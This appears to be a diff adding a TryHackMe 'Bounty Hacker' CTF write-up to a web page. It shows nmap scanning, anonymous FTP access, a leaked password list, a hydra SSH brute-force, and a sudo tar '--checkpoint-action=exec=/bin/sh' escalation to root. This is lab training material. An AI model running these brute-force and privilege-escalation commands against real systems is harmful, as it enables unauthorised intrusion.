@@ -50,7 +50,7 @@
                 </div>
                 <hr>
                 <div>
-                    <img src="../../../assets/img/thm/bounty-hacker/9ad38a2cc31d6ae0030c888aca7fe646.jpeg">
+                    <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/9ad38a2cc31d6ae0030c888aca7fe646.jpeg">
                 </div>
                 <hr>
                 <div class="tag-list">
@@ -66,7 +66,7 @@
         <main>
             <div class="wt-section">
                 <h1> Introduction </h1>
-                <p class="writeup-text"> Bounty Hacker is one of the 'free rooms' implemented by TryHackMe. </p>
+                <p class="writeup-text"> Bounty Hacker is one of the 'free rooms' implemented by TryHackMe. You have to find and obtain user & root flags.  </p>
                 <ul>
                     <li>
                         <p class="writeup-text"> Name : Bounty Hacker</p>
@@ -77,21 +77,250 @@
                     <li>
                         <p class="writeup-text"> OS : Linux </p>
                     </li>
+                    <li>
+                        <p class="writeup-text"> Type : Web-App Security </p>
+                    </li>
                 </ul>
                 <p class="writeup-text"> Let's dive into the challenge ! </p>
             </div>
             <div class="wt-section">
-                <h1> Enumeration </h1>
-                <p class="writeup-text"> I firstly added the machine ip address to my /etc/hosts files : </p>
-                <p class="writeup-text"> <code>$ sudo echo '{MACHINE-IP} bouty.thm' >> /etc/hosts </code> </p>
+                <h1> Reconnaissance </h1>
+                <p class="writeup-text"> I firstly added the machine ip address to my /etc/hosts file : </p>
+                <p class="writeup-text"> <code>$ sudo echo '{MACHINE-IP} bounty.thm' >> /etc/hosts </code> </p>
                 <p class="writeup-text"> I used nmap scanner to enumerate open ports on the machine : </p>
-                <p class="writeup-text"> <code>$ nmap -A bounty.thm </code> </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+$ nmap -A bounty.thm
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 12:18 CEST
+Nmap scan report for bounty.thm (10.10.186.141)
+Host is up (0.059s latency).
+Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.18.43.24
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
+|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
+|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 17.72 seconds
+                    </code>
+                </p>
+                <p class="writeup-text"> There is nothing interesting on the web page, we can skip this part. </p>
+                <p class="writeup-text"> Now, we can see that there is the FTP (21) port open with Anonymous login allowed. Let’s check this : </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+$ ftp bounty.thm
+
+Connected to bounty.thm.
+220 (vsFTPd 3.0.3)
+Name (bounty.thm:amanara): Anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+                    </code>
+                </p>
+                <p class="writeup-text"> Nice, now that we are connected to the FTP, we can search for interesting files. </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+ftp> ls -la
+
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
+drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+                    </code>
+                </p>
+                <p class="writeup-text"> Okay, looks like there are some interesting files. We can download them with these commands : </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+ftp> get locks.txt
+
+local: locks.txt remote: locks.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for locks.txt (418 bytes).
+226 Transfer complete.
+418 bytes received in 0.10 secs (4.0254 kB/s)
+
+ftp> get task.txt
+
+local: task.txt remote: task.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for task.txt (68 bytes).
+226 Transfer complete.
+68 bytes received in 0.00 secs (23.5400 kB/s)
+ftp>
+                    </code>
+                </p>
+                <p class="writeup-text"> We can exit the FTP since there is no other interesting files. Now, let’s check their content. </p>
+                    <code class="shell-response">
+$ cat task.txt
+
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+                    </code>
+                </p>
+                <p class="writeup-text challenge-answer"><span> Who wrote the task list ? </span> Answer : lin </p>
             </div>
+
             <div class="wt-section">
-                <h1>Challenge 2</h1>
-                <p>...</p>
+                <h1> Getting a shell </h1>
+                <p class="writeup-text">
+                    <code class="shell-response">
+$ cat locks.txt
+
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+                    </code>
+                </p>
+                <p class="writeup-text"> Ok, it looks like a password list. Maybe to bruteforce a login service. Since we know who wrote the task list (lin), we have a potential user. We also know that SSH service is open on the machine. So let’s try to bruteforce the SSH login with the user ‘lin’ and the password list that we found in the FTP.</p>
+                <p class="writeup-text challenge-answer"><span> What service can you bruteforce with the text file found ? </span> Answer : SSH </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+$ hydra -l lin -P locks.txt ssh://bounty.thm
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations,
+or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-31 14:06:49
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://bounty.thm:22/
+[22][ssh] host: bounty.thm   login: lin   password: [REDACTED]
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-31 14:06:54
+                    </code>
+                </p>
+                <p class="writeup-text challenge-answer"><span> What is the users password ? </span> Answer : [REDACTED] </p>
+                <p class="writeup-text"> Yeah ! We found the password for ‘lin’ user. Now we can login with these credentials in SSH. </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+$ ssh lin@bounty.thm
+
+lin@bounty.thm's password:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+
+* Documentation:  https://help.ubuntu.com
+* Management:     https://landscape.canonical.com
+* Support:        https://ubuntu.com/advantage
+
+83 packages can be updated.
+0 updates are security updates.
+
+Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
+lin@bountyhacker:~/Desktop$
+                    </code>
+                </p>
+                <p class="writeup-text"> It works ! (as expected lol). Now that we have an initial user access, let’s search the user.txt file : </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+lin@bountyhacker:~/Desktop$ find / -name user.txt 2>/dev/null
+
+/home/lin/Desktop/user.txt
+                    </code>
+                </p>
+                <p class="writeup-text"> Now we can display the content to answer THM room question : </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+lin@bountyhacker:~/Desktop$ cat /home/lin/Desktop/user.txt
+
+THM{REDACTED}
+                    </code>
+                </p>
+                <p class="writeup-text challenge-answer"><span> user.txt ? </span> Answer : THM{REDACTED} </p>
             </div>
-            <!-- Ajouter des sections supplémentaires pour chaque challenge -->
+
+            <div class="wt-section">
+                <h1> Privilege escalation </h1>
+                <p class="writeup-text"> Since we have the user flag, we should escalate our privileges to display the root.txt file content. I firstly search for sudo misconfiguration : </p>
+                    <code class="shell-response">
+lin@bountyhacker:~/Desktop$ sudo -l
+
+[sudo] password for lin:
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+                    </code>
+                </p>
+                <p class="writeup-text"> Nice, we have the permission to use /bin/tar as root. Let’s search on https://gtfobins.github.io for ‘tar’ binary sudo bypass. </p>
+                <div>
+                    <img class="writeup-img" src="../../../assets/img/thm/bounty-hacker/tar-sudo.png">
+                </div>
+                <p class="writeup-text"> Found it ! Now let’s escalate our privileges to root by copying this command. </p>
+                <p class="writeup-text"> Since we have the user flag, we should escalate our privileges to display the root.txt file content. I firstly search for sudo misconfiguration : </p>
+                    <code class="shell-response">
+lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+[sudo] password for lin:
+tar: Removing leading `/' from member names
+# whoami
+root
+                    </code>
+                </p>
+                <p class="writeup-text"> Nice, and now we just have to display the content of the root.txt file : </p>
+                    <code class="shell-response">
+# cat /root/root.txt
+
+THM{REDACTED}
+                    </code>
+                </p>
+                <p class="writeup-text challenge-answer"><span> root.txt ? </span> Answer : THM{REDACTED} </p>
+                <p class="writeup-text"> Yeaaah ! Finally pwned ! Pretty easy huh ? </p>
+            </div>
         </main>
 
         <footer>
